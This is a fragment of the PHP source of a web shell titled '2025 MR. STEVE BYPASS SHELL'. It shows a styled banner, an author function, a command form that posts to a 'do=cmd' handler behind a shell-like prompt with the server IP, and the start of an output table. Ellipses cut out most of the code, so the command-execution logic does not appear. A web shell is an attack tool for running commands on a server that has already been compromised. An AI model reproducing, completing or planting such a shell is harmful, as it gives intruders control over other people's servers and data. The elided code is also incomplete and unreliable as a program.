...
<html>
<head>
	<title>2025 MR. STEVE BYPASS SHELL</title>
</head>
...
<center>
	<br><br><br><br>
<font face="Bungee" size="7" color="red">2025 MR. STEVE BYPASS SHELL</font></center>
...
function author() {
	echo "<center>2025 MR. STEVE BYPASS SHELL</center>";
	exit();
}
...
print "<form method='post' action='?do=cmd&dir=".path()."' style='margin-top: 15px;'>
			  ".usergroup()->Command."Command".$GLOBALS['SERVERIP'].": ~ $
...
echo '<div id="content"><table width="800" border="4" cellpadding="6" cellspacing="0" align="center">
<tr class="first">
